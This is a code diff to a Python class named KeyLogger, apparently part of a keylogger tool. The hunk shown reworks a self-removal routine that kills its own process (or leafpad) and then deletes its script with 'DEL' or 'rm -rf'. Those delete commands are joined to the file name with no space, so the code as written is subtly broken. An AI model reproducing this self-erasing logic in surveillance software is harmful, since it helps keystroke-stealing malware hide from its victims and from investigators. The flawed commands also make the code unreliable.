@@ -100,17 +100,18 @@ class KeyLogger:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
                 os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+                print('File was closed.')
+                os.system("DEL" + os.path.basename(__file__))
             except OSError:
-                print('File is still open.')
-                os.system("DEL" + __file__)
+                print('File is close.')
 
         else:
             try:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
                 os.system('pkill leafpad')
-                print('File is still open.')
-                os.system("rm -rf" + __file__ )
+                print('File was closed.')
+                os.system("rm -rf" + os.path.basename(__file__))
             except OSError:
                 print('File is close.')
 
